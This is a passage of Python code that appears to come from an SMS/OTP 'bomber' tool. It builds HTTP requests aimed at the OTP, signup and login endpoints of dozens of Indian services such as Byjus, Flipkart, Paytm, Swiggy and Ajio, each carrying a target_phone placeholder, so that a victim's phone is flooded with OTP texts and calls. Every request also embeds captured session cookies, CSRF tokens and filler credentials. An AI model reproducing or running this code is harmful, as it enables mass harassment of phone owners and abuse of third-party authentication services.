            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://unacademy.com",
            "cookie": "_gat_UA-69016858-2=1; _anonymous_id=M-67682; lux_uid=160079427639164156; anonymous_session_id=3d4cc928-6a73-4f39-a10f-5c0d381ea8e7; mp_535208d541f9b5935ef91a365b0439e1_mixpanel=%7B%22distinct_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24device_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22utm_source%22%3A%20%22google%22%2C%22utm_medium%22%3A%20%22cpc%22%2C%22utm_campaign%22%3A%20%221944493080%22%2C%22utm_content%22%3A%20%22%7Bcontent%7D%22%2C%22utm_term%22%3A%20%22unacademy%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22Platform%22%3A%20%22Desktop%22%7D; loginRoute=%2F; _gat=1; _gac_UA-69016858-2=1.1600792925.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE; _gcl_aw=GCL.1600792920.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE; afUserId=d196d301-85b9-45ee-8a34-a66d1ed0a1aa-c; _ttgclid=CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE; _gid=GA1.2.2120759531.1600792879; _ga=GA1.2.1664858815.1600792879; _fbp=fb.1.1600792863709.1257609187; source=google; _gcl_au=1.1.762851911.1600792854"
        },
        "data": {"phone": target_phone, "country_code": "IN", "otp_type": 1, "email": "", "send_otp": True, "is_un_teach_user": False}
    })

    # 18. Byjus
    requests_list.append({
        "method": "POST",
        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
        "headers": {
            "Host": "bcas-prod.byjusweb.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://byjus.com",
            "referer": "https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE"
        },
        "data": f"phoneNumber={target_phone}&page=free-trial-classes"
    })

    # 19. Redbus (GET)
    requests_list.append({
        "method": "GET",
        "url": f"https://m.redbus.in/api/getOtp?number={target_phone}&cc=91&whatsAppOpted=undefined",
        "headers": {
            "Host": "m.redbus.in",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "origin": "https://m.redbus.in",
            "cookie": "InsuranceSelectionMandatoryAB=true; _gaexp=GAX1.2.ydiJq7nqRp2qwH9bGeJ7iA.18643.1; AMP_TOKEN=%24RETRIEVING; _dc_gtm_UA-9782412-15=1; bm_sv=9E28BBBC7C50B7C4696B372D8BAC57DD~FujGt6Eg0nVxRjbs7w16SYQxRrn4ibS6C4O35nNI46Wa54pu8oLqBL+8LXCBXSu+qNLsaA2z3EhBQ2NJOGFgZQOFJni0ltCOTwkdIBEWFLvWXJqyjP9aBobJWXAb033QYLekls1QUUPTHpXX/N6Z3qfl2T+jfIWZn2/L+BMMEWk=; tvc_user_type=new; _gat_UA-9782412-15=1; _gid=GA1.3.500450699.1603883075; _ga=GA1.3.1053631502.1603883075; tvc_session_alive_bus=1; tvc_smc_bus=google / organic / (not set); onetap=1; browserDetailLogged=true; ak_bmsc=62C933CFC108F5A7DB2E4DB99B81A517312C8DB7255F00003F50995F653B6B3A~pl0AUU7E0Y4mYuTnusgXPCAIx3wuJ0BKA4VoJxFOPMnHcyqkHjYGhu/zJlnq2f7ZekdNEepf+qicaUQJTv9mpALDXDYb+qwnDAp0isRSh0hNxaJX80eZsoXaS9ll2J8wOxBEKPCWqckjgfKPKuj0F5RvI99oEaWFShskRvKwAib8OottTL3nAl3w1R+xZ17DeOhUJkdXgIoRrXeU1351r9DlzO6LVO9dpdPSm6W0VB+yk=; rbuuid=5abc9630-190d-11eb-9b77-b99a83976b59; selectedCurrency=INR; language=en; defaultlanguage=en; currency=INR; country=IND; country_ISO=IN"
        }
    })

    # 20. Careers360
    requests_list.append({
        "method": "POST",
        "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
        "headers": {
            "Host": "www.careers360.com",
            "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.careers360.com",
            "cookie": "_gcl_au=1.1.1168325424.1600579108; WZRK_G=4584ba1e8345400d92392a88464c9183; __asc=ce35392c174a9f2fbe2f2c29a0c; __auc=ce35392c174a9f2fbe2f2c29a0c; _ga=GA1.2.1646044729.1600579108; _gid=GA1.2.365026440.1600579108; _fbp=fb.1.1600579107930.1446075664; dataLayer_=Home Pages; csrftoken=RI5TGK7tuZdkJjVNzu3lRdSeRcztdtYqfsLmngbNRK1lMH7Uir1qFprpSgCI2ZNy; _omappvp=RIeaJ0pgkcvqwRygRT8VTxJ6PrpnRvze6xwTpZBXztsuBXhgRV5OIU97g9s0DivdxwVAHM0DF1teulefRfsK0wCo2MRjp325; G_ENABLED_IDPS=google; _dc_gtm_UA-46098128-1=1; _omappvs=1600579353765; WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A5%2C%22s%22%3A1600579103%2C%22t%22%3A1600579356%7D"
        },
        "data": f"mobile_number={target_phone}&method=call&uid=12692588"
    })

    # 21. Coolwinks (GET)
    requests_list.append({
        "method": "GET",
        "url": f"https://api.coolwinks.com/api/accounts/is_already_registered/?username={target_phone}",
        "headers": {
            "Host": "api.coolwinks.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "origin": "https://www.coolwinks.com"
        }
    })

    # 22. Cansell
    requests_list.append({
        "method": "POST",
        "url": "https://webapi.cansell.in/api/User/SignUp",
        "headers": {
            "Host": "webapi.cansell.in",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://m.cansell.in"
        },
        "data": {"name": "Uwusjsj", "surname": "wjeshs", "email": "hsjs@gmail.com", "phone": target_phone, "password": "eeeeee"}
    })

    # 23. Gaana (Indiatimes)
    requests_list.append({
        "method": "POST",
        "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        "headers": {
            "Host": "jsso1.indiatimes.com",
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Cookie": "bm_sz=3185FA3CAAAF8BF3058604B10A671B95~YAAQ1Y0sMTkMfql0AQAAlUo4qwliHs15jkMexu1aNjEN8flD/z5LtSgQGynujCg13M4JSO4ngtKZ0upFyNBCQ7S0uzz118OjWhFVgf58p0Nm9h2GwqTJ6JQdKEEL+X3CzGTsv1rq/VFRAda6LCAWN456iJIhY0YTqPKFsRnVsKN4e5wY0RPTA7t0jCSPuyzFIEn3; _abck=815544E3DE0B9D20C0579C4BDD367BC8~-1~YAAQ1Y0sMToMfql0AQAAlUo4qwREAoH9ULlj0dvHMO+x8J1BtAjNeouGQsG9yzY5n8wdltMClCjNw81OTfwcAV/sFBz8BKBqtNcY8NqWE9Qxpu79nALy06xH2PUU0f2QUM3U8L1KYEuHRByl+07NOj5l8/ndZlP1k06L3GCL9ndWnryiFTQhrnhan0uBbzJIcgcgOf57TqwC5RJwlJCC8j+BeZq0FG1ISubR8UJoa1n3NCYSjCvvW0UDN/haWIAxDbNclqOFxx6dIeUhFx1IbypgQGsktxMWS1WMKGThxrQRJJV2FG8hDgDOXE3LpA==~-1~-1~-1"
        },
        "data": {"mobile": "+91-" + target_phone}
    })

    # 24. Flipkart (two requests)
    requests_list.append({
        "method": "POST",
        "url": "https://1.rome.api.flipkart.com/1/action/view",
        "headers": {
            "Host": "1.rome.api.flipkart.com",
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "origin": "https://www.flipkart.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/json",
            "cookie": "T=BR%3Ackfcu8grn0xqvyyvwni4yxp6o.1600711394531; vh=632; vw=360; dpr=2; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18527%7CMCMID%7C76403100668224989248663375062116515669%7CMCAAMLH-1601316203%7C12%7CMCAAMB-1601316203%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1600718605s%7CNONE%7CMCAID%7CNONE; s_cc=true; S=d1t14P0w/Pz8/Pz8/P3MSPyJaPxDnS+xX3DDqgNzmvw1zqm7YyImq0FXfp+hM4pKH58SFBsLxvXQ+P8Cz8lO4CyVM5w==; SN=VI40F03BF14E7C4B628CD08259542FE831.TOKC0B6874C268A424DB5DCA004325C0C2F.1600711730.LO; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT"
        },
        "data": {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": target_phone,
                "clientQueryParamMap": {"ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT"},
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    })
    requests_list.append({
        "method": "GET",
        "url": f"https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        "headers": {
            "Host": "img1a.flixcart.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "referer": f"https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={target_phone}&loginIdentifierPrefix=%2B91&sourceContext=default&ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&supportedAuthenticationTypes=password&churned=false"
        }
    })

    # 25. Ullu
    requests_list.append({
        "method": "POST",
        "url": f"https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={target_phone}",
        "headers": {
            "Host": "ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "origin": "https://ullu.app",
            "cookie": "_fbp=fb.1.1600715934726.1447032121; __stripe_sid=5807554c-54bc-45e8-a9c9-29ed36e779f298c41e; __stripe_mid=61958e5d-6e35-476d-8b25-35de8dc0e55bcd3559; G_ENABLED_IDPS=google; _gat_gtag_UA_126575807_1=1; _gid=GA1.2.1612551927.1600715932; _ga=GA1.2.1941258238.1600715932"
        }
    })

    # 26. Paytm
    requests_list.append({
        "method": "POST",
        "url": "https://accounts.paytm.com/v2/api/register",
        "headers": {
            "Host": "accounts.paytm.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://accounts.paytm.com",
            "cookie": "bm_sz=C3DEDDABBCB6E76563706756F75C11A7~YAAQBI0sMQ9J0rF0AQAAGNwhsgl73OX8RyMOLhj4W4LXhRtHX9U2K/AmO1VYDUmLW4gKfOdtR6XWEvHUYoU5UgAAQvJTf6Sb3UmpjG/PLkwpri7ZHjCfMjgxXPOzqIRU/gLju9kAH/6dZZHPqy+tMFHhwx62ajcy3Ga1X0zO8Jjnp3Wxy2hK/7HgIEOI1CM=; bm_mi=540981F9F36D1544FEC97D099B53B53D~p9uVoaZIXMR5xK6k5lSZoJ/3FerRdOYvIPl3Hn6tTBoGwEWGZR4jeCKPVbtwXVlGmFHvYY1G6wP+yQDVir7OWEiF6RTg+3WjZ+h8KHg99TpIiJi1ELxBbguW7K0wNAjN5VCLGt1iv/pQ49j9HFjqvjKe9FHmY2NlmCFBLJSIT9el5s6QFmKkKGIT8mdtyhYqax1l6+LumeKZ3VsYeaIwv/6qYy0u9SWYHZpGh8guJDzPKM4s+dhSMTgdm3UEC4KBG51HKVHzPDlsM4fL5+e6GWyM0gkk4DqNJIcCnTwlRCU=; ak_bmsc=F8EAD94DECE07AE1EFE40A9582B5CF2D312C8D04FD5C00006DFE685F77272D3B~plcGUGZxShuIGFCeOpP68aJwg4G4r/YvFYehnveWSNhVfiGee+U1CtEXU9456Id8di6ewHICFCeUqW8BtrM3De/1nkvdeDht3qvcnG7IGkECYuMTRfK0Jhnvq+P+AVzphXerowqtTahsCY8ftXm4nUJG6n7ivFRBPNg9Xivi3rJp/aUE9fRdFtjhpDDD6201sRJnAKI7EKgBc9oTc+pW6Wfi2qW6b0tOgdDtEpGN90Ndfoll3whyTScdjCnQgeXCJC; _abck=45A4857E6B593E42F78976A08356DD9F~0~YAAQBI0sMddJ0rF0AQAA6O4hsgQPQwGVxJ7H6HN5HdNhBLY3VAskkFvejjgx6FJ/4r760cOUSDmU20pVbrc5F7utD7+WHcMoE9XXkM94FULZ64FbH4b/FJQRa7C0tMpZZvGGhhEmD7hmbpeYm/+DSi0aYcnkoD/VUQxVrPRVC9ayrUw++SusmU0pYuxAaHvlgo7+yw7cIdgebFyTTnRMDW/rNXC6FIZb5Iq7vIRIH4WAdd9C6EcL0tYmktTXaRK52+c0XfrpjtfjAfYVeq8YUWILROIOTUp3VBOYt23O5KnuFqpdjpROswkNKNCBJrLDwf/3A2dH~-1~||-1||~-1; returning_usr=1; bm_sv=DA28E6771684381F7602D33009AD7A67~cDaMe2LqH5njmD8wD8YJSs3oXzmH2Dd+n088p+XrJ5zVS+oDLveaBbMu9cIqQh31CGrdQ03246dyOUebPadurlP2lI3SMSTM7gwc/qHpzEJqxsgFYE3JmF1u8UJpEX5nAAQUtbG4gPS0nvQhx9ebVmw2Yx3+1ZIRMVJPOfAT89U="
        },
        "data": {"email": "", "mobile": target_phone, "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "redirectUri": "https://paytm.com/v1/api/authresponse", "clientId": "paytm-web-secure", "scope": "paytm", "state": "", "responseType": "code", "theme": "mp-html5", "dob_agreement": True}
    })

    # 27. Ogonn
    requests_list.append({
        "method": "POST",
        "url": "https://ogonn.in/otp",
        "headers": {
            "Host": "ogonn.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://ogonn.in",
            "cookie": "laravel_session=eyJpdiI6Ik9UWFwvZzlxdEozVk5ITmZGYnhQM1F3PT0iLCJ2YWx1ZSI6IituT2hPUDd0eWFhdHI2RFNjRk9GXC91Vk9DOXRaV295TzFrc041ZnAwNjNuaEJSZkxaU0JzN2FvbXNxVzA1S2trIiwibWFjIjoiMTU4YjdmYzFkMzZiNTdkMjhjZDA3MGY2YjllNTcxMzMwODU3ZjQ5ZGY2NTcyMzE5ZDhlNWFlMjNhZjc3MWYyOCJ9; XSRF-TOKEN=eyJpdiI6IkVWVEMrUW80TU1rc2U1R1pza1E2b1E9PSIsInZhbHVlIjoidWxPYUxYamtqaVh2QVFjNzlsVlZadHE2TG5VWlVPalwvN0xmTDJcLzFJSzBSaTFvSisxZmxnVmZrb20rdkQ5UkE3IiwibWFjIjoiOTZiZTA1MmM1ZTZhY2Q2NGNkYjAwOTBjZmUzMTJlNzNmNGVmMzgxYzU5ZmZhODc3ZmJkZWMwZmRjNjk4N2UxYSJ9; _fbp=fb.1.1600717201907.1836998376"
        },
        "data": f"_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={target_phone}"
    })

    # 28. Aakash Digital (two endpoints)
    requests_list.append({
        "method": "POST",
        "url": "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        "headers": {
            "Host": "digital.aakash.ac.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://digital.aakash.ac.in",
            "cookie": "_co_session_active=1; _gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.3.1265004790.1600719997; _ga=GA1.3.1759859626.1600719997; _fbp=fb.2.1600720004859.138019050; _gat_UA-132222061-1=1; _gac_UA-132222061-1=1.1600719997.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.4.1265004790.1600719997; _ga=GA1.4.1759859626.1600719997; AWSALB=72X09cOjNjRUWWCFBkPfC4pzIxNDaf7UOluGPLojxXMlbny21JQrAgsBxD2kPx47rLJscBQ4+YLSLds2TCR7ltut261umPg7FUh1IBCt4tCi8kjCQIzPem5vmWxd"
        },
        "data": f"&mobileval={target_phone}&otp=6230"
    })
    requests_list.append({
        "method": "POST",
        "url": "https://digital.aakash.ac.in/signup-otp-verify",
        "headers": {
            "Host": "digital.aakash.ac.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://digital.aakash.ac.in",
            "cookie": "__zlcmid=10IjS9ldmuaIwof; _co_session_active=1; _gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.3.1265004790.1600719997; _ga=GA1.3.1759859626.1600719997; _fbp=fb.2.1600720004859.138019050; _hjIncludedInSessionSample=1; _gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE; _gid=GA1.4.1265004790.1600719997; _ga=GA1.4.1759859626.1600719997; AWSALB=dc39iVQJB7z5bxbK+8AZ/kOwW29goA5mAejiW5ecDoRFe5kGjNfw2I7KdE72gvy0JdR+T98HU7sz/9SX2sS7zbjR5mfmkhdngzxHGshtH9XM94QFW5L0uL+aIzpf; cto_bundle=wRx-il9KZ1ZVUFBBUEdtaDhUbExxZnBYcTJTOXZXd050Z0E3TnElMkZqNyUyRlZ3VGRZcGNuZjJJUDZ4MFlyZk9waTdsQjJLMUFtWDlpdG1XWG5iT1hZSU9VeGslMkJRQ21uJTJCaWplbW94cEZaaDZpZ3FMMnBKUmV3OFN4d1h6SVo3clQ1VjFQOEtQS2RLV2U0ajBPMnc1NnJyMUwlMkYxSkVnJTNEJTNE; _uetvid=d753b1ed7dd67a59bebc401d8ab4515b; _uetsid=946c3602e20e8980818f215fc8fac48f; _gcl_au=1.1.2026770221.1600758975; wh-widget-cookie=1; _hjid=30609baa-1084-4a2e-998c-54e41f4084fd; _hjTLDTest=1"
        },
        "data": f"&mobileval={target_phone}"
    })

    # 29. Swiggy
    requests_list.append({
        "method": "POST",
        "url": "https://www.swiggy.com/mapi/auth/signup",
        "headers": {
            "Host": "www.swiggy.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.swiggy.com",
            "cookie": "_gid=GA1.2.1062400057.1600721785; _ga=GA1.2.933128931.1600721785; __cf_bm=49fd023d2de2dcc513416b86f346ef849ff78965-1600721801-1800-AffpoGFA9y2uIXnuTnsdWLAvACoa7Yoi0Atoa5go3TwGhcCaro5zMawagaz/3h6h+magOo4GhTCbVieffp6NXM0=; _device_id=becf3981-4f8f-41e0-b3dd-3188b909ae13; afUserId=e5d4b7d4-1473-4953-8dd8-7db0c6a7c614-p; __cfduid=d4953510590027eff3cccf0ec29bd40121600721785; AMP_TOKEN=%24NOT_FOUND; _gcl_au=1.1.1262278937.1600721784; _sid=p6q1ed4e-90a6-4c83-b56b-f1af071a0b17; _guest_tid=ac1bb2e7-f54c-45cb-8a69-5ebd7b6706f5; __SW=bcBBQ8mXgTrUPE0YKx8A44dDIVVH5UoB"
        },
        "data": {"name": "dbdbdbd", "email": "tsunami@gmail.com", "password": "sndndndbdj283jsbsbs", "referral_code": "", "mobile": target_phone, "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}
    })

    # 30. Limeroad
    requests_list.append({
        "method": "POST",
        "url": "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=",
        "headers": {
            "Host": "www.limeroad.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.limeroad.com",
            "cookie": "locale=hi; lrVr=v2; AWSALB=Aum/5hkqPnGDduYS/RwPuH4NMlb8KsEWzmAcaduTtaaRrPdqiZ76xnnTdzuLPupgFMK3xXY3uJH4GgYj9V5wN9MLnEwGPNy2LdlaCycYQQSBcBOfEaMI5VsVlx3/; testCookie=v2; deviceHeight=632; deviceWidth=360; gender=M; duid=e9e7b3ffb31375ea608dc18f9da4e98c; _session_id=e2b24a146c5a10f5f7abf753786a12d9; nH=1; newCssOpt=v1; _ruid=9a0ef1da-cd58-4e5e-a326-09c0e757be5a; jr_token=true%3F%3F7b529cb3-c933-43cf-9ec1-360139c2d56e%3F%3Fjoulroad%3F%3F8fe37c95-270b-4a92-81f9-2a8d684cac66%3F%3FGuest; a_n_u_a=1"
        },
        "data": f"utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={target_phone}"
    })

    # 31. Cilory
    requests_list.append({
        "method": "POST",
        "url": "https://www.cilory.com/app/w/auth/soft",
        "headers": {
            "Host": "www.cilory.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.cilory.com",
            "cookie": "2ceb3d353e9c50fe7a9dad32e9e13b2a=IlS0K5pquXDrkAGJ4KMhpPkViw5v6JpcBK%2Fo0kMH8Ac3xz8xhstQoj6kxqf98nqjdK6C3J1P%2FvinTLjgm6uYZUF1S0sA8eCOQ%2F4zan%2BdtjQ%3D123456; _fbp=fb.1.1600749694805.191445483; _gcl_aw=GCL.1600749692.EAIaIQobChMIkorHyvj76wIVVqWWCh1XDQ-UEAQYCSABEgJce_D_BwE; _gat_gtag_UA_18030761_1=1; _gac_UA-18030761-1=1.1600749692.EAIaIQobChMIkorHyvj76wIVVqWWCh1XDQ-UEAQYCSABEgJce_D_BwE; _gid=GA1.2.468416282.1600749692; _ga=GA1.2.2135791951.1600749692"
        },
        "data": {"mobile": target_phone}
    })

    # 32. Ajio (two requests)
    requests_list.append({
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/accountCheck",
        "headers": {
            "Host": "login.web.ajio.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.ajio.com",
            "cookie": "FirstPage=Tue Sep 22 2020 10:56:22 GMT+0530 (IST); cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AThu%2C%2022%20Oct%202020%2005%3A26%3A29%20GMT%7C; _fp=3bb177293be711354c411930e1c5a87b; _ga=GA1.2.741522456.1600752380; _gid=GA1.2.1110829528.1600752380; _gac_UA-68002030-1=1.1600752389.EAIaIQobChMI6MWt_YL86wIVQZ_CCh13KwoHEAQYDiABEgI94vD_BwE; V=201; TS01fe4249=01ef61aed0002976a57b4d1bb8abc432bc6065f29099a472ea7f37800ed6f0344eaca4aeb95e747321704d1b608a74c8f71e11dd2f0a7ed84c45017f54a62bb31323cfbeb7; uI=9519874704; TS017df282=01ef61aed045c87a16cd6397e020723e2c6b61f0afebf7d3ac273bcf3b708d4fd2ce15171afb2a7cac64409db30eb76abe89effe8a046fd375ed2169ab7af96233a02f1c21; WZRK_G=ab70e1057e5e479ba540650bf8aa228a; WZRK_S_48K-4R4-K84Z=%7B%22p%22%3A6%2C%22s%22%3A1600752384%2C%22t%22%3A1600752586%7D; sessionStatus=true|undefined; cto_bundle=m71QbF9GWENqWWJaJTJCVWtlNUFVNzAydUNTYnk4VXkzYm9NdzdkbTJQeUEzWWlzQUxtMiUyQnVYWjVWaFlXT2g1bDVlNXNhdUVROTdBR2ZNb2JwJTJCZHhZRUs4SEolMkZRQVVMemtkdWo2QzNyV09wVVFrVDZsYU1DYTAyMk1pdlhLeWM0T3hWQmdrcjNaNjNqcUFTdGhwZ1Z6cWZwQVQyUSUzRCUzRA; _fbp=fb.1.1600752385516.1674349488"
        },
        "data": {"emailId": "tsunami@gmail.com"}
    })
    requests_list.append({
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "headers": {
            "Host": "login.web.ajio.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.ajio.com"
        },
        "data": {"firstName": "Tsunami Bomber", "login": "tsunami@gmail.com", "password": "kd34646@3131nxnxn", "genderType": "", "mobileNumber": target_phone, "requestType": "SENDOTP"}
    })

    # 33. BookMyShow
    requests_list.append({
        "method": "POST",
        "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        "headers": {
            "Host": "in.bookmyshow.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://in.bookmyshow.com",
